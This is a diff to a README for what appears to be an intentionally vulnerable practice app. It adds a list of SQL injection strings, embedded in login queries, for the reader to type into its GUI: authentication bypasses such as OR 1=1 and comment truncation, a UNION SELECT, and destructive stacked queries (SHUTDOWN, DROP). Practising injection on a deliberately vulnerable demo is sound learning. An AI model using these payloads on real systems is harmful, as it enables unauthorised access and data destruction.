@@ -82,6 +82,25 @@ The database has the following user credentials in it
 
 .. image:: http://i.imgur.com/qlzSCuP.jpg
 
+**NOTE**
+
+Some more naughty queries
+
+.. code:: sql
+
+    SELECT * FROM users WHERE username='admin'--' AND password=''
+    SELECT * FROM users WHERE username='admin' AND password='' OR 1=1--'
+    SELECT * FROM users WHERE username='';SHUTDOWN --' AND password=''
+    SELECT * FROM users WHERE username='*' AND password='' OR 1==1--'
+    SELECT * FROM users WHERE username='admin'#' AND password=''
+    SELECT * FROM users WHERE username='';DROP tempTable;' AND password=''
+    SELECT * FROM users WHERE username='admin' AND password='' OR 1=1 --IamJOE'
+    SELECT * FROM users WHERE username='admin' AND password=' ' OR ''=''
+    SELECT * FROM users WHERE username='CAST('username' AS SIGNED INTEGER)' AND password=''
+    SELECT * FROM users WHERE username='' UNION SELECT SUM(columntofind) FROM users--' AND password=''
+
+Enter the ``username`` and ``password`` in the GUI and watch the money pile up!
+
 Running it
 ==========
 `[Back to top] <https://github.com/prodicus/thanos#thanos>`__
